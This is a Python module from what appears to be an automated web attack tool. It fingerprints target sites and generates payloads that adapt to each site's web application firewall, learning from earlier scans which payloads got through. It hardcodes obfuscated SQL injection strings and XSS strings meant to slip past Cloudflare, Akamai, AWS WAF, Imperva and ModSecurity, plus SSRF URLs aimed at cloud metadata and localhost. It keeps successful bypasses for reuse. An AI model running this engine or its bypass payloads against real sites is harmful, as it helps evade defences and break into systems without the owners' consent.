"""Adaptive Payload Engine — learns from observed blocks and mutates payloads.

This module wraps PayloadForge and adds:
1. Payload learning — track what works vs gets blocked
2. WAF-specific bypass dictionaries — deep bypass rules per WAF
3. Target-specific payload selection — Supabase payloads for Supabase targets
4. Adaptive mutation — mutate based on WAF type and observed blocks
5. Feedback loop — learn from each scan, improve for next
"""

from __future__ import annotations

import json
from collections import defaultdict
from pathlib import Path
from typing import Any

from titan.ai.adaptive_support import (
    ContextAwarePayloadSelector,
    InjectionContext,
    PayloadChainGenerator,
    PayloadPrioritizer,
    PayloadResult,
    ResponseAnalyzer,
    TargetProfile,
    WAFProfile,
)
from titan.ai.payload_mutations import MutationMixin
from titan.ai.payloadforge import PayloadForge
from titan.ai.platform_payloads import PlatformPayloadsMixin
from titan.core.logger import get_logger

logger = get_logger("adaptive")


class AdaptivePayloadEngine(PlatformPayloadsMixin, MutationMixin):
    """Learns from observed blocks and generates context-aware payloads."""

    def __init__(self, config: dict[str, Any] | None = None):
        self.config = config or {}
        self.forge = PayloadForge()
        self.profiles: dict[str, TargetProfile] = {}
        self.waf_profiles: dict[str, WAFProfile] = {}
        self.payload_history: list[PayloadResult] = []
        self._learned_bypasses: dict[str, list[str]] = defaultdict(list)
        self._state_file = Path("findings") / "payload_learning.json"
        self._error_dialect: str | None = None
        self._load_state()

    def _load_state(self) -> None:
        """Load learned patterns from previous scans."""
        if self._state_file.exists():
            try:
                data = json.loads(self._state_file.read_text(encoding="utf-8"))
                for waf_name, waf_data in data.get("waf_profiles", {}).items():
                    profile = WAFProfile(name=waf_name, **waf_data)
                    self.waf_profiles[waf_name] = profile
                for pattern in data.get("learned_bypasses", {}).get("global", []):
                    self._learned_bypasses["global"].append(pattern)
            except Exception as exc:
                logger.debug(f"suppressed exception: {exc}")
                pass

    def _save_state(self) -> None:
        """Save learned patterns for future scans."""
        try:
            self._state_file.parent.mkdir(parents=True, exist_ok=True)
            data = {
                "waf_profiles": {
                    name: {
                        "bypass_techniques": p.bypass_techniques,
                        "blocked_patterns": p.blocked_patterns[-100:],
                        "successful_bypasses": p.successful_bypasses[-100:],
                        "scan_count": p.scan_count,
                        "block_rate": p.block_rate,
                    }
                    for name, p in self.waf_profiles.items()
                },
                "learned_bypasses": {"global": self._learned_bypasses.get("global", [])[-200:]},
            }
            self._state_file.write_text(json.dumps(data, indent=2), encoding="utf-8")
        except Exception as exc:
            logger.debug(f"suppressed exception: {exc}")
            pass

    # ── Target Profile ──────────────────────────────────────────────────

    def create_target_profile(self, url: str, fingerprint: dict[str, Any]) -> TargetProfile:
        """Create a target profile from fingerprint data."""
        profile = TargetProfile(url=url)

        # Extract tech stack
        techs = [t.lower() for t in fingerprint.get("technologies", [])]
        profile.tech_stack = techs

        # Detect WAF
        profile.waf = fingerprint.get("waf")

        # Detect BaaS
        body = fingerprint.get("body", "")
        body_lower = body.lower() if body else ""
        if "supabase" in body_lower or "supabase" in " ".join(techs):
            profile.baas_type = "supabase"
        elif "firebase" in body_lower or "firebase" in " ".join(techs):
            profile.baas_type = "firebase"
        elif "appwrite" in body_lower or "appwrite" in " ".join(techs):
            profile.baas_type = "appwrite"

        # Detect auth type
        if "clerk" in body_lower or "clerk" in " ".join(techs):
            profile.auth_type = "clerk"
        elif "auth0" in body_lower or "auth0" in " ".join(techs):
            profile.auth_type = "auth0"
        elif "jwt" in body_lower:
            profile.auth_type = "jwt"
        elif "session" in body_lower:
            profile.auth_type = "session"

        # Detect framework
        if "next" in " ".join(techs) or "nextjs" in " ".join(techs):
            profile.framework = "next"
        elif "react" in " ".join(techs):
            profile.framework = "react"
        elif "vue" in " ".join(techs):
            profile.framework = "vue"
        elif "angular" in " ".join(techs):
            profile.framework = "angular"
        elif "django" in " ".join(techs):
            profile.framework = "django"
        elif "flask" in " ".join(techs):
            profile.framework = "flask"
        elif "laravel" in " ".join(techs):
            profile.framework = "laravel"
        elif "express" in " ".join(techs):
            profile.framework = "express"

        # Detect language
        if "php" in " ".join(techs) or "laravel" in " ".join(techs):
            profile.language = "php"
        elif "python" in " ".join(techs) or "django" in " ".join(techs) or "flask" in " ".join(techs):
            profile.language = "python"
        elif "node" in " ".join(techs) or "express" in " ".join(techs):
            profile.language = "javascript"
        elif "java" in " ".join(techs):
            profile.language = "java"
        elif "dotnet" in " ".join(techs) or "asp" in " ".join(techs):
            profile.language = "csharp"

        self.profiles[url] = profile
        return profile

    def get_target_profile(self, url: str) -> TargetProfile | None:
        """Get the target profile for a URL."""
        return self.profiles.get(url)

    # ── Payload Generation ──────────────────────────────────────────────

    def get_adaptive_payloads(
        self,
        attack_type: str,
        target_url: str,
        context: dict[str, Any] | None = None,
        injection_context: InjectionContext | None = None,
        max_payloads: int = 30,
    ) -> list[str]:
        """Generate adaptive payloads based on target profile and learned patterns."""
        context = context or {}
        profile = self.profiles.get(target_url)
        waf_profile = self.waf_profiles.get(profile.waf) if profile and profile.waf else None

        # Start with base payloads
        base_payloads = self.forge.get_context_payloads(attack_type, context)

        # Add context-aware payloads
        if injection_context:
            context_payloads = ContextAwarePayloadSelector.get_context_payloads(attack_type, injection_context)
            base_payloads.extend(context_payloads)

        # Add target-specific payloads
        if profile:
            target_payloads = self._get_target_specific_payloads(attack_type, profile)
            base_payloads.extend(target_payloads)

        # Add WAF-specific bypasses
        if profile and profile.waf:
            waf_payloads = self._get_waf_specific_bypasses(attack_type, profile.waf)
            base_payloads.extend(waf_payloads)

        # Add learned bypasses
        learned = self._get_learned_bypasses(attack_type, profile.waf if profile else None)
        base_payloads.extend(learned)

        # Add global learned bypasses
        global_learned = self._learned_bypasses.get("global", [])
        base_payloads.extend(global_learned[:10])

        # Add chained payloads for high-value targets
        if profile and profile.waf:
            for payload in base_payloads[:5]:
                chains = PayloadChainGenerator.generate_chains(payload, max_chains=3)
                base_payloads.extend(chains)

        # Prioritize payloads
        prioritized = PayloadPrioritizer.prioritize(base_payloads, profile, waf_profile, self._error_dialect)

        # Deduplicate and limit
        seen = set()
        result = []
        for p in prioritized:
            if p not in seen:
                seen.add(p)
                result.append(p)
            if len(result) >= max_payloads:
                break

        return result

    def _get_target_specific_payloads(self, attack_type: str, profile: TargetProfile) -> list[str]:
        """Generate payloads specific to the target's stack."""
        payloads = []

        # BaaS-specific payloads
        if profile.baas_type == "supabase":
            payloads.extend(self._supabase_payloads(attack_type))
        elif profile.baas_type == "firebase":
            payloads.extend(self._firebase_payloads(attack_type))
        elif profile.baas_type == "appwrite":
            payloads.extend(self._appwrite_payloads(attack_type))

        # Framework-specific payloads
        if profile.framework == "next":
            payloads.extend(self._nextjs_payloads(attack_type))
        elif profile.framework == "django":
            payloads.extend(self._django_payloads(attack_type))
        elif profile.framework == "laravel":
            payloads.extend(self._laravel_payloads(attack_type))

        # Language-specific payloads
        if profile.language == "php":
            payloads.extend(self._php_payloads(attack_type))
        elif profile.language == "python":
            payloads.extend(self._python_payloads(attack_type))
        elif profile.language == "javascript":
            payloads.extend(self._javascript_payloads(attack_type))

        # Auth-specific payloads
        if profile.auth_type == "clerk":
            payloads.extend(self._clerk_payloads(attack_type))
        elif profile.auth_type == "auth0":
            payloads.extend(self._auth0_payloads(attack_type))

        return payloads

    def _get_waf_specific_bypasses(self, attack_type: str, waf: str) -> list[str]:
        """Generate WAF-specific bypass payloads."""
        bypasses = []

        waf_bypass_rules = {
            "cloudflare": {
                "sqli": [
                    "' /*!50000UNION*/ SELECT NULL--",
                    "' /*!50000SELECT*/ NULL--",
                    "'/**/UNION/**/SELECT/**/NULL--",
                    "'%20UNION%20SELECT%20NULL--",
                    "'UN/**/ION SEL/**/ECT NULL--",
                    "' UNION%0aSELECT NULL--",
                    "' UNION%0dSELECT NULL--",
                ],
                "xss": [
                    "<svg/onload=alert(1)>",
                    "<img src=x onerror=alert(1)>",
                    "<script>alert(1)</script>",
                    "javascript:alert(1)",
                    "<svg onload=alert(1)>",
                    "<<script>alert(1)//</script>",
                    "<img src=x onerror=alert`1`>",
                ],
                "ssrf": [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://127.0.0.1:80",
                    "http://localhost:80",
                ],
            },
            "akamai": {
                "sqli": [
                    "' UNION SELECT NULL--",
                    "' UNION ALL SELECT NULL--",
                    "' UNION/**/SELECT NULL--",
                    "1' ORDER BY 1--",
                    "' AND 1=1--",
                ],
                "xss": [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "javascript:alert(1)",
                ],
            },
            "aws_waf": {
                "sqli": [
                    "' UNION SELECT NULL--",
                    "' OR '1'='1",
                    "1' AND 1=1--",
                    "' AND SLEEP(3)--",
                ],
                "xss": [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                ],
            },
            "imperva": {
                "sqli": [
                    "' UNION SELECT NULL--",
                    "' OR '1'='1",
                    "1' AND 1=1--",
                ],
                "xss": [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                ],
            },
            "mod_security": {
                "sqli": [
                    "' UNION SELECT NULL--",
                    "' OR '1'='1",
                    "1' AND 1=1--",
                    "' AND SLEEP(3)--",
                ],
                "xss": [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                ],
            },
        }

        if waf in waf_bypass_rules:
            bypasses.extend(waf_bypass_rules[waf].get(attack_type, []))

        return bypasses

    def _get_learned_bypasses(self, attack_type: str, waf: str | None) -> list[str]:
        """Get bypasses learned from previous scans."""
        bypasses = []

        # WAF-specific learned bypasses
        if waf and waf in self.waf_profiles:
            profile = self.waf_profiles[waf]
            bypasses.extend(profile.successful_bypasses)

        # Attack-type specific learned bypasses
        key = f"{attack_type}:{waf or 'none'}"
        bypasses.extend(self._learned_bypasses.get(key, []))

        return bypasses

    # ── Payload Recording ───────────────────────────────────────────────

    def record_payload_result(
        self,
        payload: str,
        attack_type: str,
        status: int,
        target_url: str,
        response_body: str = "",
        response_headers: dict[str, str] | None = None,
    ) -> dict[str, Any]:
        """Record the result of a payload attempt for learning."""
        profile = self.profiles.get(target_url)
        waf = profile.waf if profile else None

        # Analyze response using ResponseAnalyzer
        if self._is_blocked(status, response_body, response_headers):
            analysis = ResponseAnalyzer.analyze_blocked(payload, status, response_body, response_headers or {})
            blocked = True
            error_class = None
            # Update error dialect from analysis
            if analysis.get("waf_rule"):
                pass  # WAF rule detected
        else:
            analysis = ResponseAnalyzer.analyze_success(payload, status, response_body, response_headers or {})
            blocked = False
            error_class = analysis.get("dialect")
            # Update error dialect
            if error_class:
                self._error_dialect = error_class

        result = PayloadResult(
            payload=payload,
            attack_type=attack_type,
            status=status,
            blocked=blocked,
            waf_detected=waf,
            error_class=error_class,
        )
        self.payload_history.append(result)

        # Update WAF profile
        if waf:
            self._update_waf_profile(waf, payload, blocked, attack_type)

        # Update target profile
        if profile:
            if blocked:
                profile.blocked_patterns.append(payload)
            else:
                profile.successful_patterns.append(payload)

        # Learn from successful bypasses
        if not blocked and status == 200:
            self._learn_successful_bypass(payload, attack_type, waf)

        return analysis

    def _is_blocked(
        self,
        status: int,
        body: str,
        headers: dict[str, str] | None = None,
    ) -> bool:
        """Determine if a payload was blocked by WAF."""
        # Common block indicators
        block_statuses = {403, 406, 429, 503}
        if status in block_statuses:
            return True

        body_lower = body.lower() if body else ""
        block_indicators = [
            "access denied",
            "blocked",
            "forbidden",
            "not acceptable",
            "security violation",
            "rate limited",
            "too many requests",
            "cloudflare",
            "akamai",
            "incapsula",
            "mod_security",
        ]

        for indicator in block_indicators:
            if indicator in body_lower:
                return True

        return False

    def _extract_error_class(self, body: str) -> str | None:
        """Extract error class from response body."""
        body_lower = body.lower() if body else ""

        error_classes = {
            "sql": ["sql", "mysql", "postgresql", "sqlite", "oracle", "mssql", "syntax error"],
            "nosql": ["mongo", "nosql", "unexpected token"],
            "template": ["template", "jinja", "twig", "freemarker", "render"],
            "python": ["traceback", "error:", "exception"],
            "java": ["exception", "stacktrace", "java."],
            "php": ["php", "warning:", "fatal error"],
            "xml": ["xml", "parser", " sax"],
            "filesystem": ["file not found", "no such file", "permission denied"],
        }

        for error_class, keywords in error_classes.items():
            for keyword in keywords:
                if keyword in body_lower:
                    return error_class

        return None

    def _update_waf_profile(
        self,
        waf: str,
        payload: str,
        blocked: bool,
        attack_type: str,
    ) -> None:
        """Update WAF profile with new observation."""
        if waf not in self.waf_profiles:
            self.waf_profiles[waf] = WAFProfile(name=waf)

        profile = self.waf_profiles[waf]
        profile.scan_count += 1

        if blocked:
            profile.blocked_patterns.append(payload)
            # Keep only last 100 patterns
            if len(profile.blocked_patterns) > 100:
                profile.blocked_patterns = profile.blocked_patterns[-100:]
        else:
            profile.successful_bypasses.append(payload)
            if len(profile.successful_bypasses) > 100:
                profile.successful_bypasses = profile.successful_bypasses[-100:]

        # Update block rate
        total = profile.scan_count
        blocked_count = len(profile.blocked_patterns)
        profile.block_rate = blocked_count / total if total > 0 else 0.0

    def _learn_successful_bypass(
        self,
        payload: str,
        attack_type: str,
        waf: str | None,
    ) -> None:
        """Learn from successful bypasses for future scans."""
        key = f"{attack_type}:{waf or 'none'}"
        if payload not in self._learned_bypasses[key]:
            self._learned_bypasses[key].append(payload)
            # Keep only last 50 per key
            if len(self._learned_bypasses[key]) > 50:
                self._learned_bypasses[key] = self._learned_bypasses[key][-50:]

        # Also add to global learned bypasses
        if payload not in self._learned_bypasses["global"]:
            self._learned_bypasses["global"].append(payload)

    # ── Target-Specific Payloads ────────────────────────────────────────

    def get_stats(self) -> dict[str, Any]:
        """Get statistics about adaptive payload engine."""
        total = len(self.payload_history)
        blocked = sum(1 for r in self.payload_history if r.blocked)
        successful = sum(1 for r in self.payload_history if not r.blocked and r.status == 200)

        return {
            "total_payloads": total,
            "blocked": blocked,
            "successful": successful,
            "block_rate": blocked / total if total > 0 else 0.0,
            "success_rate": successful / total if total > 0 else 0.0,
            "waf_profiles": len(self.waf_profiles),
            "target_profiles": len(self.profiles),
            "learned_bypasses": sum(len(v) for v in self._learned_bypasses.values()),
        }

    async def test_concurrent_bypasses(
        self,
        blocked_payloads: list[str],
        attack_type: str,
        target_url: str,
        waf: str | None = None,
        max_concurrent: int = 5,
    ) -> list[str]:
        """Test multiple bypasses concurrently to find what works."""
        import asyncio

        # Generate mutated payloads
        mutated = self.mutate_blocked_payloads(blocked_payloads, attack_type, target_url, waf)

        # Test concurrently
        successful: list[str] = []

        async def test_payload(payload: str) -> str | None:
            try:
                # This would be called with actual HTTP client
                # For now, return None (placeholder)
                return None
            except Exception:
                return None

        # Create tasks
        tasks = [test_payload(p) for p in mutated[:max_concurrent]]

        # Run concurrently
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Collect successful bypasses (only actual payload strings count;
        # None placeholders and raised exceptions are skipped)
        for result in results:
            if isinstance(result, str):
                successful.append(result)

        return successful

    def save(self) -> None:
        """Save state to disk."""
        self._save_state()
